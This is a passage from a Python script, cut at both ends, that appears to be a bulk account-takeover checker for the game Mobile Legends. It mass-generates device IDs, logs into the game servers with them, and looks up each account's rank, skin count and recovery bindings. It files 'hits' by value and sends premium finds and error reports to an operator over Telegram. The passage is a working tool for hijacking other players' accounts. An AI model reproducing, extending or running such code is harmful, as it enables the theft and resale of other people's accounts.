    if os.path.exists(output_file): os.remove(output_file)

    with FORMAT_STATS_LOCK:
        FORMAT_STATS.clear()

    queue = Queue(maxsize=100000)
    writer = threading.Thread(target=writer_thread, args=(queue, output_file))
    writer.start()

    executor = ThreadPoolExecutor(max_workers=threads)
    tasks = []
    chunk_size = 50000
    lines_left = target_lines

    while lines_left > 0:
        take = min(chunk_size, lines_left)
        tasks.append(executor.submit(generate_worker_verified, take, queue))
        lines_left -= take

    for future in tasks:
        future.result()

    queue.put(None)
    writer.join()
    executor.shutdown()

    actual_size = os.path.getsize(output_file) / (1024 * 1024)
    
    print(f"\n{Fore.GREEN}✓ Generated {target_lines:,} devices{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Target  : {size_mb:.2f} MB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Actual  : {actual_size:.2f} MB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  File    : {output_file}{Style.RESET_ALL}")
    
    if OEM_MODE == "D":
        print(f"\n{Fore.YELLOW}Format Distribution:{Style.RESET_ALL}")
        with FORMAT_STATS_LOCK:
            stats = dict(FORMAT_STATS)
        total = max(sum(stats.values()), 1)
        for name, count in sorted(stats.items(), key=lambda x: -x[1]):
            pct = (count / total) * 100
            bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
            print(f"  {name:<18} {bar} {count:>8,} ({pct:5.1f}%)")

# ────────────────────────────────────────────────────────────────
# 9. HIT SAVE + ERROR HITS
# ────────────────────────────────────────────────────────────────

def get_rank_file(rank_category):
    rank_files = {
        "warrior": os.path.join(OUTPUT_DIR, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite": os.path.join(OUTPUT_DIR, FOLDERS["rank_elite"], "elite_hits.txt"),
        "master": os.path.join(OUTPUT_DIR, FOLDERS["rank_master"], "master_hits.txt"),
        "gm": os.path.join(OUTPUT_DIR, FOLDERS["rank_gm"], "grandmaster_hits.txt"),
        "epic": os.path.join(OUTPUT_DIR, FOLDERS["rank_epic"], "epic_hits.txt"),
        "legend": os.path.join(OUTPUT_DIR, FOLDERS["rank_legend"], "legend_hits.txt"),
        "mythic": os.path.join(OUTPUT_DIR, FOLDERS["rank_mythic"], "mythic_hits.txt"),
    }
    return rank_files.get(rank_category)

def is_already_saved(device_id, filepath):
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def should_send_to_telegram(rank_category, skin_count, highest_rank):
    if rank_category in ["legend", "mythic"]: return True
    if skin_count >= 100: return True
    if "Glory" in highest_rank or "Immortal" in highest_rank:
        if get_stars_from_rank(highest_rank) >= 50:
            return True
    return False

def format_account_card(device, acc, zone, pd, mode="DIRECT"):
    return "\n".join([
        "═" * 60,
        f"🟢 NORMAL HIT ({mode})",
        f"Device ID    : {device}",
        f"Account      : {acc} ({zone})",
        f"Nickname     : {pd.get('nickname', 'N/A')} (Lv.{pd.get('level', 'N/A')})",
        f"Rank         : {pd.get('current_rank', 'Unranked')}",
        f"Max Rank     : {pd.get('highest_rank', 'N/A')}",
        f"Heroes       : {pd.get('hero_count', 0)}",
        f"Skins        : {pd.get('skin_count', 0)}",
        f"V2L          : {pd.get('v2l_status', 'N/A')}",
        f"Mt           : {'clear' if pd.get('mt_status','clear')=='clear' else 'bound'}",
        f"Mt mail      : {'clear' if pd.get('mt_mail_status','clear')=='clear' else 'bound'}",
        f"3rd          : {'clear' if pd.get('third_party_status','clear')=='clear' else 'bound'}",
        f"Offline      : {pd.get('offline_days', 'N/A')}",
        f"Last Online  : {pd.get('last_online', 'N/A')}",
        f"Created      : {pd.get('created_at', 'N/A')}",
        "═" * 60,
    ])

def save_error_hit(device_id, acc, zone, reason, mode="DIRECT"):
    error_data = {
        'device': device_id,
        'acc': acc,
        'zone': zone,
        'reason': reason,
        'mode': mode,
        'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
    }
    
    with SAVE_LOCK:
        with open(FILES["error_hits"], "a", encoding='utf-8') as f:
            f.write(
                "═" * 60 + "\n"
                f"🔴 ERROR HIT ({mode})\n"
                f"Device ID    : {device_id}\n"
                f"Account      : {acc} ({zone})\n"
                f"Reason       : {reason}\n"
                f"Mode         : {mode}\n"
                f"Time         : {error_data['time']}\n"
                + "═" * 60 + "\n\n"
            )
    
    with HIT_LIST_LOCK:
        ERROR_HIT_LIST.append(error_data)
    
    with LIVE_STATS['lock']:
        LIVE_STATS['error_hits'] += 1
    
    return error_data

def save_account(account_info, player_data, mode="DIRECT"):
    global HIT_COUNTERS
    device = account_info.get('Device id', '')
    acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')

    ban_stat = player_data.get('ban_status', 'NORMAL')
    if 'ban' in str(ban_stat).lower():
        with SAVE_LOCK:
            with open(os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt"), "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK:
            HIT_COUNTERS['banned'] += 1
        return

    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""):
        save_error_hit(device, acc, zone, "No nickname/player info", mode)
        return

    skin = player_data.get('skin_count', 0)
    v2l = player_data.get('v2l_status', 'N/A')
    v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
               "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"

    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_category = get_rank_category(cur_rank)
    rank_folder = get_rank_file(rank_category)
    highest_rank = player_data.get('highest_rank', 'Unranked')

    card_text = format_account_card(device, acc, zone, player_data, mode)

    with SAVE_LOCK:
        if not is_already_saved(device, FILES["all_hits_detail"]):
            with open(FILES["all_hits_detail"], "a", encoding='utf-8') as f:
                f.write(card_text + "\n")

        if not is_already_saved(device, FILES["raw_devices_detail"]):
            with open(FILES["raw_devices_detail"], "a", encoding='utf-8') as f:
                f.write(f"{device}\n")

        if rank_folder and not is_already_saved(device, rank_folder):
            with open(rank_folder, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")

        if v2l_text == "ACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1

        if skin >= 200:
            sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
            if not is_already_saved(device, sultan_file):
                with open(sultan_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1

    with HIT_LIST_LOCK:
        HIT_LIST.append({
            'device': device, 'acc': acc, 'zone': zone,
            'nickname': nick, 'level': player_data.get('level', 'N/A'),
            'skin': skin, 'hero': player_data.get('hero_count', 0),
            'rank': cur_rank, 'max_rank': highest_rank, 'v2l': v2l_text,
            'mt': 'clear' if player_data.get('mt_status','clear')=='clear' else 'bound',
            'mt_mail': 'clear' if player_data.get('mt_mail_status','clear')=='clear' else 'bound',
            '3rd': 'clear' if player_data.get('third_party_status','clear')=='clear' else 'bound',
            'offline': player_data.get('offline_days', 'N/A'),
            'last_online': player_data.get('last_online', 'N/A'),
            'created': player_data.get('created_at', 'N/A'),
            'mode': mode,
            'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
        })

    if should_send_to_telegram(rank_category, skin, highest_rank):
        mt = "clear" if player_data.get('mt_status','clear')=='clear' else "bound"
        mt_mail = "clear" if player_data.get('mt_mail_status','clear')=='clear' else "bound"
        third = "clear" if player_data.get('third_party_status','clear')=='clear' else "bound"
        tg_message = (
            f"🔥 <b>PREMIUM ACCOUNT FOUND!</b>\n"
            f"─────────────────────────\n"
            f"📱 <code>{device}</code>\n"
            f"🆔 <b>{acc}</b> ({zone})\n"
            f"👤 <b>{nick}</b> (Lv.{player_data.get('level', 'N/A')})\n"
            f"🏆 {cur_rank}\n"
            f"⭐ {highest_rank}\n"
            f"🦸 {player_data.get('hero_count', 0)} | 🎨 {skin}\n"
            f"🔐 V2L: {'🟢' if v2l_text == 'ACTIVE' else '🔓'} {v2l_text}\n"
            f"📧 Mt: {mt} | 📮 Mt mail: {mt_mail} | 🔗 3rd: {third}\n"
            f"⏰ Offline: {player_data.get('offline_days', 'N/A')}\n"
            f"═════════════════════════════════\n"
            f"✨ <b>PREMIUM DEVID SEKER</b>\n"
            f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
        )
        threading.Thread(target=send_telegram_once, args=(device, tg_message), daemon=True).start()

    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1

# ────────────────────────────────────────────────────────────────
# 10. CHECKERS
# ────────────────────────────────────────────────────────────────

def process_direct(device_id, account_id, zone_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                return {'status': 'FAIL'}
            if not conn.get_game_server():
                return {'status': 'ERROR_HIT', 'reason': 'Game server failed'}
            if not conn.connect_to_game_server():
                return {'status': 'ERROR_HIT', 'reason': 'Game connect failed'}

            skin_info = conn.get_skin_role_info(account_id, zone_id)
            ban_stat = conn.check_ban_status()
            if 'ban' in ban_stat.lower():
                return {'status': 'BANNED', 'reason': ban_stat}

            moonton = get_moonton_status(conn, account_id, zone_id)
            v2l = get_v2l_status(conn, account_id, zone_id)
            result = conn.lookup_player(account_id)
            role_info = conn.get_role_info(account_id, zone_id)

            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and result[0] and isinstance(result[0][0], dict):
                    pd = result[0][0]
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                else:
                    pd = result

            skin_info = skin_info if isinstance(skin_info, dict) else {}
            role_info = role_info if isinstance(role_info, dict) else {}

            nick = pd.get(2) or skin_info.get(2) or role_info.get(2)
            if not nick or str(nick).lower() in ("unknown", "guest", ""):
                return {'status': 'ERROR_HIT', 'reason': 'No nickname'}

            level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            skin_cnt = skin_info.get(10) if skin_info.get(10) is not None else pd.get(83, 0)
            hero_cnt = skin_info.get(9) if skin_info.get(9) is not None else role_info.get(9, 0)
            cur_rk_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
            max_rk_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0

            last_online_ts = (pd.get(21) or pd.get(22) or pd.get(23) or
                              skin_info.get(21) or skin_info.get(22) or
                              role_info.get(21) or role_info.get(22) or 0)
            offline_info = compute_offline_info(last_online_ts)

            created_raw = pd.get(42) or conn.creation_ts
            created_at = "N/A"
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except: pass

            return {
                'status': 'SUCCESS',
                'data': {
                    'device': device_id, 'acc': account_id, 'zone': zone_id,
                    'nickname': nick, 'level': level,
                    'skin_count': skin_cnt, 'hero_count': hero_cnt,
                    'current_rank': map_rank(cur_rk_val),
                    'highest_rank': map_rank(max_rk_val) if max_rk_val else map_rank(cur_rk_val),
                    'v2l_status': v2l,
                    'mt_status': moonton.get('mt', 'clear'),
                    'mt_mail_status': moonton.get('mt_mail', 'clear'),
                    'third_party_status': moonton.get('third_party', 'clear'),
                    'offline_days': offline_info['offline_days'],
                    'last_online': offline_info['last_online'],
                    'created_at': created_at,
                    'ban_status': ban_stat,
                }
            }
    except Exception as e:
        return {'status': 'FAIL', 'reason': str(e)}

def process_api(device_id, account_id, zone_id):
    try:
        resp = requests.post(
            INFO_URL,
            json={"role_id": str(account_id), "zone_id": str(zone_id), "type": "lookup"},
            headers={"x-api-key": INFO_API_KEY, "Content-Type": "application/json"},
            timeout=API_TIMEOUT
        )
        data = resp.json()
        if data.get("status") == 0 and data.get("data"):
            d = data["data"]
            nick = d.get('name', 'N/A')
            if not nick or nick == 'N/A':
                return {'status': 'ERROR_HIT', 'reason': 'API: No name'}
            return {
                'status': 'SUCCESS',
                'data': {
                    'device': device_id, 'acc': account_id, 'zone': zone_id,
                    'nickname': nick, 'level': d.get('level', 'N/A'),
                    'skin_count': d.get('skin_count', 0), 'hero_count': d.get('hero_count', 0),
                    'current_rank': d.get('rank', 'Unranked'),
                    'highest_rank': d.get('high_rank', 'N/A'),
                    'v2l_status': 'N/A',
                    'mt_status': 'N/A', 'mt_mail_status': 'N/A', 'third_party_status': 'N/A',
                    'offline_days': 'N/A', 'last_online': 'N/A', 'created_at': 'N/A',
                    'ban_status': 'NORMAL',
                }
            }
        return {'status': 'ERROR_HIT', 'reason': f"API: {data.get('message', 'No data')}"}
    except Exception as e:
        return {'status': 'ERROR_HIT', 'reason': f"API: {e}"}

# ────────────────────────────────────────────────────────────────
# 11. BULK CHECK
# ────────────────────────────────────────────────────────────────

def run_bulk_detail():
    global LIVE_STATS, CHECK_MODE
    print_header("🔥 PREMIUM BULK CHECK")

    print(f"{Fore.CYAN}Select Check Mode:{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} {Fore.GREEN}DIRECT{Style.RESET_ALL} — MLBB server (Full info)")
    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} {Fore.CYAN}API{Style.RESET_ALL}    — checkton.online (Basic)")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} {Fore.MAGENTA}BOTH{Style.RESET_ALL}   — Direct, API fallback")
    print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} 🔙 Back\n")

    mode_ch = input(f"{Fore.CYAN}Choose (0-3, default=1): {Style.RESET_ALL}").strip()
    if mode_ch == '0': return
    
    mode_map = {'1': 'DIRECT', '2': 'API', '3': 'BOTH', '': 'DIRECT'}
    CHECK_MODE = mode_map.get(mode_ch, 'DIRECT')
    print(f"\n{Fore.GREEN}✓ Mode: {CHECK_MODE}{Style.RESET_ALL}\n")

    import glob
    txt_files = glob.glob(os.path.join(OUTPUT_DIR, "**", "*.txt"), recursive=True)
    txt_files = [f for f in txt_files if "hits" not in os.path.basename(f).lower() 
                 and "report" not in os.path.basename(f).lower()
                 and "banned" not in os.path.basename(f).lower()]

    if not txt_files:
        print(f"{Fore.RED}No .txt files!{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Enter...{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}Select input file:{Style.RESET_ALL}")
    for i, f in enumerate(txt_files[:20], 1):
        print(f"  {Fore.YELLOW}[{i}]{Style.RESET_ALL} {os.path.relpath(f, '.')}")
    print(f"  {Fore.YELLOW}[0]{Style.RESET_ALL} Back\n")

    choice = input(f"{Fore.CYAN}Choice: {Style.RESET_ALL}").strip()
    if choice == '0': return

    try:
        idx = int(choice) - 1
        input_file = txt_files[idx] if 0 <= idx < len(txt_files) else None
        if not input_file: return
    except: return

    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        devices = [l.strip() for l in f if l.strip()]

    if not devices:
        print(f"{Fore.RED}Empty file.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Enter...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}Loaded {len(devices):,} devices{Style.RESET_ALL}")

    threads = input(f"{Fore.CYAN}Threads (default 15): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 15

    with HIT_LIST_LOCK:
        HIT_LIST.clear()
        ERROR_HIT_LIST.clear()
    
    LIVE_STATS = {
        'checked': 0, 'hits': 0, 'banned': 0, 'invalid': 0, 'error_hits': 0,
        'start_time': time.time(), 'lock': threading.Lock()
    }

    print(f"\n{Fore.CYAN}Starting {CHECK_MODE} check ({threads} threads)...{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}{'─'*80}{Style.RESET_ALL}")

    def check_one(dev):
        with LIVE_STATS['lock']:
            LIVE_STATS['checked'] += 1
            n = LIVE_STATS['checked']
            elapsed = time.time() - LIVE_STATS['start_time']
            speed = n / elapsed if elapsed > 0 else 0

        acc, zone, stat = GameLogin(dev).run()
        if not acc or not zone:
            with LIVE_STATS['lock']:
                LIVE_STATS['invalid'] += 1
                i = LIVE_STATS['invalid']
                h = LIVE_STATS['hits']
                b = LIVE_STATS['banned']
                eh = LIVE_STATS['error_hits']
            sys.stdout.write(
                f"\r{Fore.RED}✗{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{Fore.LIGHTBLACK_EX}{dev[:35]}...{Style.RESET_ALL} → "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}E:{eh}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{i} ({speed:.1f}/s){Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
            return

        if CHECK_MODE == 'DIRECT':
            result = process_direct(dev, acc, zone)
        elif CHECK_MODE == 'API':
            result = process_api(dev, acc, zone)
        else:
            result = process_direct(dev, acc, zone)
            if result.get('status') in ('ERROR_HIT', 'FAIL'):
                api_res = process_api(dev, acc, zone)
                if api_res.get('status') == 'SUCCESS':
                    result = api_res

        status = result.get('status')
        
        if status == 'SUCCESS':
            data = result['data']
            save_account(
                {'Device id': dev, 'role_id': acc, 'zone_id': zone},
                data, CHECK_MODE
            )
            with LIVE_STATS['lock']:
                LIVE_STATS['hits'] += 1
                h = LIVE_STATS['hits']
                b = LIVE_STATS['banned']
                i = LIVE_STATS['invalid']
                eh = LIVE_STATS['error_hits']
            
            sys.stdout.write(
                f"\r{Fore.GREEN}✓{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{Fore.YELLOW}{dev[:35]}...{Style.RESET_ALL} → "
                f"acc={Fore.CYAN}{acc}{Style.RESET_ALL} | "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}E:{eh}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{i} ({speed:.1f}/s){Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
            
        elif status == 'ERROR_HIT':
            reason = result.get('reason', 'Unknown')
            save_error_hit(dev, acc, zone, reason, CHECK_MODE)
            with LIVE_STATS['lock']:
                h = LIVE_STATS['hits']
                b = LIVE_STATS['banned']
                i = LIVE_STATS['invalid']
                eh = LIVE_STATS['error_hits']
            
            sys.stdout.write(
                f"\r{Fore.MAGENTA}⚠{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{Fore.YELLOW}{dev[:35]}...{Style.RESET_ALL} → "
                f"acc={Fore.CYAN}{acc}{Style.RESET_ALL} | "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}E:{eh}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{i} ({speed:.1f}/s){Style.RESET_ALL} "
                f"[{reason[:25]}]\n"
            )
            sys.stdout.flush()
            
        elif status == 'BANNED':
            with LIVE_STATS['lock']:
                LIVE_STATS['banned'] += 1
            sys.stdout.write(
                f"\r{Fore.RED}✗{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"BANNED — {dev[:35]}...\n"
            )
            sys.stdout.flush()
        else:
            with LIVE_STATS['lock']:
                LIVE_STATS['invalid'] += 1
            sys.stdout.write(
                f"\r{Fore.RED}✗{Style.RESET_ALL} [{n}/{len(devices)}] FAIL — {dev[:35]}...\n"
            )
            sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(check_one, devices))

    duration = time.time() - LIVE_STATS['start_time']

    print(f"\n{Fore.CYAN}{'─'*80}{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}✓ Done!{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Mode       : {CHECK_MODE}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total      : {LIVE_STATS['checked']:,}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Normal H   : {LIVE_STATS['hits']:,}{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA}Error H    : {LIVE_STATS['error_hits']:,}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Banned     : {LIVE_STATS['banned']:,}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTBLACK_EX}Invalid    : {LIVE_STATS['invalid']:,}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Time       : {duration:.1f}s | Speed: {LIVE_STATS['checked']/max(duration,1):.1f}/s{Style.RESET_ALL}")

    with HIT_LIST_LOCK:
        err_count = len(ERROR_HIT_LIST)
    
    if err_count > 0:
        print(f"\n{Fore.MAGENTA}📄 Sending Error Hits ({err_count}) to Telegram...{Style.RESET_ALL}")
        caption = (
            f"🔴 <b>ERROR HITS REPORT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Total: <b>{err_count}</b>\n"
            f"📊 Mode: <b>{CHECK_MODE}</b>\n"
            f"⏰ {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
            f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
        )
        if send_telegram_document(FILES["error_hits"], caption):
            print(f"{Fore.GREEN}✓ Sent!{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 12. DEEP CHECK — MENU [9]
# ────────────────────────────────────────────────────────────────

def deep_check_single_device(device_id: str) -> Dict[str, Any]:
    """Deep check device with multiple retries"""
    last_reason = "Unknown"
    
    for attempt in range(1, DEEP_CHECK_RETRIES + 1):
        try:
            acc, zone, stat = GameLogin(device_id).run()
            if not acc or not zone:
                last_reason = f"Login failed: {stat}"
                time.sleep(DEEP_CHECK_DELAY)
                continue
            
            result = process_direct(device_id, acc, zone)
            status = result.get('status')
            
            if status == 'SUCCESS':
                return {'status': 'HIT', 'data': result['data'], 'attempts': attempt}
            elif status == 'BANNED':
                return {'status': 'BANNED', 'reason': result.get('reason', 'Banned'), 'attempts': attempt}
            elif status == 'ERROR_HIT':
                last_reason = result.get('reason', 'Error')
                time.sleep(DEEP_CHECK_DELAY)
                continue
            else:
                last_reason = 'FAIL'
                time.sleep(DEEP_CHECK_DELAY)
                continue
                
        except Exception as e:
            last_reason = str(e)
            time.sleep(DEEP_CHECK_DELAY)
            continue
    
    return {'status': 'STILL_ERROR', 'reason': last_reason, 'attempts': DEEP_CHECK_RETRIES}


def parse_error_hits_file(filepath: str) -> List[Dict]:
    """Parse error_hits.txt to extract device IDs"""
    if not os.path.exists(filepath):
        return []
    
    devices = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        blocks = re.split(r'═{10,}', content)
        
        for block in blocks:
            block = block.strip()
            if not block: continue
            
            dev_match = re.search(r'Device ID\s*:\s*(and_[\w\-]+|ios_[\w\-]+)', block)
            if not dev_match: continue
            
            device = dev_match.group(1).strip()
            
            acc_match = re.search(r'Account\s*:\s*(\d+)\s*\((\d+)\)', block)
            acc = acc_match.group(1) if acc_match else '?'
            zone = acc_match.group(2) if acc_match else '?'
            
            reason_match = re.search(r'Reason\s*:\s*(.+)', block)
            reason = reason_match.group(1).strip() if reason_match else 'Unknown'
            
            devices.append({
                'device': device,
                'acc': acc,
                'zone': zone,
                'reason': reason,
            })
        
        # Remove duplicates
        seen = set()
        unique = []
        for d in devices:
            if d['device'] not in seen:
                seen.add(d['device'])
                unique.append(d)
        
        return unique
    except Exception as e:
        print(f"{Fore.RED}Parse error: {e}{Style.RESET_ALL}")
        return []


def run_deep_check():
    """Menu [9] — Deep Check Error Hits"""
    print_header("🔬 DEEP CHECK — ERROR HITS")
    
    print(f"{Fore.CYAN}Re-check all Error Hits with {DEEP_CHECK_RETRIES} retries per device{Style.RESET_ALL}\n")
    
    error_file = FILES["error_hits"]
    
    if not os.path.exists(error_file):
        print(f"{Fore.RED}✗ No Error Hits file!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Run Bulk Check first (Menu 2).{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
        return
    
    devices = parse_error_hits_file(error_file)
    
    if not devices:
        print(f"{Fore.RED}✗ No valid devices!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}✓ Loaded {len(devices):,} Error Hit devices{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}Preview (first 5):{Style.RESET_ALL}")
    for i, d in enumerate(devices[:5], 1):
        print(f"  {i}. {d['device'][:50]}...")
        print(f"     Acc: {d['acc']} | Reason: {d['reason'][:40]}")
    
    if len(devices) > 5:
        print(f"  {Fore.LIGHTBLACK_EX}... +{len(devices)-5} more{Style.RESET_ALL}")
    
    print()
    threads_in = input(f"{Fore.CYAN}Threads (default {DEEP_CHECK_THREADS}, safe): {Style.RESET_ALL}").strip()
    threads = int(threads_in) if threads_in.isdigit() else DEEP_CHECK_THREADS
    
    print(f"\n{Fore.CYAN}Starting Deep Check with {threads} threads...{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}  Retries per device: {DEEP_CHECK_RETRIES}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}{'─'*80}{Style.RESET_ALL}")
    
    stats = {
        'checked': 0, 'hit': 0, 'still_error': 0, 'banned': 0, 'invalid': 0,
        'start_time': time.time(),
        'lock': threading.Lock(),
    }
    
    new_hits = []
    still_errors = []
    
    def check_one(dev_info):
        device = dev_info['device']
        
        with stats['lock']:
            stats['checked'] += 1
            n = stats['checked']
            elapsed = time.time() - stats['start_time']
            speed = n / elapsed if elapsed > 0 else 0
        
        result = deep_check_single_device(device)
        status = result.get('status')
        attempts = result.get('attempts', 0)
        
        if status == 'HIT':
            with stats['lock']:
                stats['hit'] += 1
                h = stats['hit']
                se = stats['still_error']
                b = stats['banned']
                inv = stats['invalid']
            
            new_hits.append(result['data'])
            
            save_account(
                {'Device id': device, 'role_id': result['data']['acc'], 'zone_id': result['data']['zone']},
                result['data'], 'DEEP_CHECK'
            )
            
            with SAVE_LOCK:
                with open(FILES["deep_check_hits"], "a", encoding='utf-8') as f:
                    d = result['data']
                    f.write(
                        "═" * 70 + "\n"
                        f"✅ DEEP CHECK HIT\n"
                        f"Device ID    : {device}\n"
                        f"Account      : {d['acc']} ({d['zone']})\n"
                        f"Nickname     : {d['nickname']} (Lv.{d['level']})\n"
                        f"Rank         : {d['current_rank']}\n"
                        f"Max Rank     : {d['highest_rank']}\n"
                        f"Skins        : {d['skin_count']}\n"
                        f"Heroes       : {d['hero_count']}\n"
                        f"V2L          : {d['v2l_status']}\n"
                        f"Mt           : {d['mt_status']}\n"
                        f"Mt mail      : {d['mt_mail_status']}\n"
                        f"3rd          : {d['third_party_status']}\n"
                        f"Offline      : {d['offline_days']}\n"
                        f"Attempts     : {attempts}/{DEEP_CHECK_RETRIES}\n"
                        f"Time         : {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
                        + "═" * 70 + "\n\n"
                    )
            
            sys.stdout.write(
                f"\r{Fore.GREEN}✅{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{Fore.YELLOW}{device[:35]}...{Style.RESET_ALL} → "
                f"{Fore.GREEN}HIT! (attempt {attempts}){Style.RESET_ALL} | "
                f"{Fore.GREEN}Hit:{h}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}Err:{se}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{inv} ({speed:.1f}/s){Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
            
        elif status == 'STILL_ERROR':
            with stats['lock']:
                stats['still_error'] += 1
                h = stats['hit']
                se = stats['still_error']
                b = stats['banned']
                inv = stats['invalid']
            
            still_errors.append({
                'device': device,
                'reason': result.get('reason', 'Unknown'),
                'attempts': attempts,
            })
            
            sys.stdout.write(
                f"\r{Fore.MAGENTA}⚠{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{Fore.YELLOW}{device[:35]}...{Style.RESET_ALL} → "
                f"{Fore.MAGENTA}Still Error ({attempts} tries){Style.RESET_ALL} | "
                f"{Fore.GREEN}Hit:{h}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}Err:{se}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{inv} ({speed:.1f}/s){Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
            
        elif status == 'BANNED':
            with stats['lock']:
                stats['banned'] += 1
                h = stats['hit']
                se = stats['still_error']
                b = stats['banned']
                inv = stats['invalid']
            
            sys.stdout.write(
                f"\r{Fore.RED}🚫{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{Fore.YELLOW}{device[:35]}...{Style.RESET_ALL} → "
                f"{Fore.RED}BANNED{Style.RESET_ALL} | "
